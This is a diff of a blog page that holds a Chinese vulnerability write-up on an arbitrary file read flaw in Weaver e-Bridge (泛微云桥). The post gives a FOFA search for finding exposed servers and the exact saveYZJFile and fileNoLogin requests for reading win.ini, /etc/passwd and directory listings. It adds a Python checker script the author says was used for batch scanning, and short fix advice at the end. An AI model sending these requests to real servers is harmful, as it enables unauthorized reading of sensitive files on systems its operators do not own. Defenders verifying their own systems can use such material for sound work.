@@ -10,7 +10,7 @@
     
     
     
-    <title>404 | spaceman&#39;blog</title>
+    <title>泛微云桥-任意文件读取 | spaceman&#39;blog</title>
     <link href="https://spaceman-911.gitee.io" rel="prefetch" />
 
     
@@ -164,10 +164,91 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-8 gal-right" id="mainstay">
-                    <!-- 搜索页面(尽可能接近ZanBlog搜索功能) -->
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="https://spaceman-911.gitee.io">spaceman&#39;blog</a>
+        >
+        <span>泛微云桥-任意文件读取</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">泛微云桥-任意文件读取</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">任意文件读取</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2021-03-28
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">泛微云桥-任意文件读取</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2021-03-28
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">任意文件读取</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h1 id="泛微云桥-任意文件读取"><a class="markdownIt-Anchor" href="#泛微云桥-任意文件读取">#</a> 泛微云桥 - 任意文件读取</h1>
+<h3 id="漏洞简介"><a class="markdownIt-Anchor" href="#漏洞简介">#</a> 漏洞简介</h3>
+<p>泛微云桥（e-Bridge）是上海泛微公司在” 互联网 +” 的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。</p>
+<h3 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本">#</a> 影响版本</h3>
+<p>2018-2019 多个版本</p>
+<h3 id="资产查找"><a class="markdownIt-Anchor" href="#资产查找">#</a> 资产查找</h3>
+<p>FOFA：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;泛微云桥&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞复现"><a class="markdownIt-Anchor" href="#漏洞复现">#</a> 漏洞复现</h3>
+<p>windows 为例</p>
+<p>例如想读取 <code>C:/Windows/win.ini</code>  文件</p>
+<p>访问  <code>/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/Windows/win.ini&amp;fileExt=txt</code></p>
+<p>获取文件 id</p>
+<p><img src="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/image-20210328172146687.png" alt="image-20210328172146687"></p>
+<p>读取文件  <code>/file/fileNoLogin/上面获取到的id</code></p>
+<p><img src="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/image-20210328172229517.png" alt="image-20210328172229517"></p>
+<p>当然可以进行目录读取，我们只需将 <code>downloadUrl</code>  参数更换为绝对路径目录即可</p>
+<p><code>/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/&amp;fileExt=txt</code></p>
+<p><img src="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/image-20210328173847259.png" alt="image-20210328173847259"></p>
+<p>目录读取： <code>/file/fileNoLogin/cb25f92f19954e99903c610d96c6b7fa</code></p>
+<p><img src="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/image-20210328173959288.png" alt="image-20210328173959288"></p>
+<p>自写垃圾检测</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">url</span>):</span></span><br><span class="line">    w_poc1 = <span class="string">&#x27;/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/Windows/win.ini&amp;fileExt=txt&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url+w_poc1,verify=<span class="literal">False</span>,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> (url,<span class="string">&#x27;    无法连接&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;msg&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        r = requests.get(url+w_poc1,verify=<span class="literal">False</span>,timeout=<span class="number">5</span>).json()[<span class="string">&quot;msg&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> r == <span class="string">&#x27;无法验证您的身份！&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span> (url,<span class="string">&#x27;    安全&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;语法不正确&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            l_poc1 = <span class="string">&#x27;/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt&#x27;</span></span><br><span class="line">            r = requests.get(url+l_poc1,verify=<span class="literal">False</span>,timeout=<span class="number">6</span>).json()[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">            <span class="keyword">if</span> r != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span> (url,<span class="string">&#x27;    系统为linux    存在漏洞！！！！！&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> (url,<span class="string">&#x27;    系统为windows    存在漏洞！！！！！&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (url,<span class="string">&#x27;    未知错误&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ip后面的斜杠不要，正确ip:http://127.0.0.1</span></span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;Url  &gt;&gt;&gt;  &#x27;</span>)</span><br><span class="line">run(url)</span><br></pre></td></tr></table></figure>
+<p>批量检测，不知道是没有找到原因，还是我脚本写的不对的原因，没有找到 linux 系统的</p>
+<p><img src="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/image-20210328184517375.png" alt="image-20210328184517375"></p>
+<h3 id="修复建议"><a class="markdownIt-Anchor" href="#修复建议">#</a> 修复建议</h3>
+<p>0x01  关闭程序路由 /file/fileNoLogin</p>
+<p>0x02  升级版本</p>
 
-<!-- 404 自定义页面 -->
-<!-- 有其他想自定义的page在这里添加判断条件, 并且写好对应的模板渲染文件 -->
+    </div>
+</article>
+
 
                 </div>
                 <aside class="col-md-4 gal-left" id="sidebar">
@@ -307,13 +388,19 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2021/02/23/%E4%BB%8E%E4%B8%80%E6%AC%A1%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0getshell/">从一次文件下载到getshell</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2021/02/23/%E4%B8%80%E6%AC%A1fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AE%9E%E6%88%98/">一次fastjson反序列化-实战</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2021/03/11/%E5%BC%B1%E5%AF%86%E7%A0%81%E4%B8%AD%E5%8F%91%E7%8E%B0%E7%9A%84%E6%8E%88%E6%9D%83%E7%BB%95%E8%BF%87/">弱密码中发现的授权绕过</a>
+                    <a href="/2021/03/14/%E9%94%90%E6%8D%B7RG-UAC%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">锐捷RG-UAC统一上网行为管理审计系统信息泄露漏洞</a>
                 </span>
             </li>
             
@@ -325,25 +412,19 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2021/03/15/Apache-Axis2-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">Apache Axis2 后台文件上传</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
                     <a href="/2021/03/18/%E6%9F%90%E6%95%B0%E5%AD%97%E5%8C%96%E6%A0%A1%E5%9B%AD%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/">某数字化校园综合管理系统-文件上传getshell</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2021/03/27/%E6%9F%90%E5%AA%92%E4%BD%93%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-by-%E6%9C%88%E7%90%83%E5%A4%A7%E5%B8%88%E5%82%85/">某媒体资源平台 权限绕过+文件上传 by 月球大师傅</a>
+                    <a href="/2021/03/27/CVE-2020-25540-ThinkAdmin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">CVE-2020-25540 ThinkAdmin任意文件读取</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">泛微云桥-任意文件读取</a>
+                    <a href="/2021/03/27/%E6%9F%90%E5%AA%92%E4%BD%93%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-by-%E6%9C%88%E7%90%83%E5%A4%A7%E5%B8%88%E5%82%85/">某媒体资源平台 权限绕过+文件上传 by 月球大师傅</a>
                 </span>
             </li>
             
@@ -358,17 +439,17 @@
 
                 
                 <li>
-                    <a href="/404.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/404.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/404.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2021/03/28/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
@@ -376,21 +457,21 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/CVE/" style="font-size: 9.475282531090418px;" class="tag-cloud-link">CVE</a>
+    <a href="/tags/CVE/" style="font-size: 8.306299667251036px;" class="tag-cloud-link">CVE</a>
     
-    <a href="/tags/MSF/" style="font-size: 16.008732159593194px;" class="tag-cloud-link">MSF</a>
+    <a href="/tags/MSF/" style="font-size: 10.398379931762364px;" class="tag-cloud-link">MSF</a>
     
-    <a href="/tags/getshell/" style="font-size: 12.688923099880942px;" class="tag-cloud-link">getshell</a>
+    <a href="/tags/getshell/" style="font-size: 8.352946084800642px;" class="tag-cloud-link">getshell</a>
     
-    <a href="/tags/%E6%9D%83%E9%99%90/" style="font-size: 9.972353306446053px;" class="tag-cloud-link">权限</a>
+    <a href="/tags/%E6%9D%83%E9%99%90/" style="font-size: 17.836555809484352px;" class="tag-cloud-link">权限</a>
     
-    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" style="font-size: 13.599859081506771px;" class="tag-cloud-link">信息泄露</a>
+    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" style="font-size: 9.652174890279923px;" class="tag-cloud-link">信息泄露</a>
     
-    <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size: 19.96141858184589px;" class="tag-cloud-link">任意文件读取</a>
+    <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size: 11.215574807455726px;" class="tag-cloud-link">任意文件读取</a>
     
-    <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 14.103381692064135px;" class="tag-cloud-link">命令执行</a>
+    <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 17.143743004928982px;" class="tag-cloud-link">命令执行</a>
     
-    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 8.974738235527738px;" class="tag-cloud-link">文件上传</a>
+    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10.128094197793118px;" class="tag-cloud-link">文件上传</a>
     
 </div>
                 
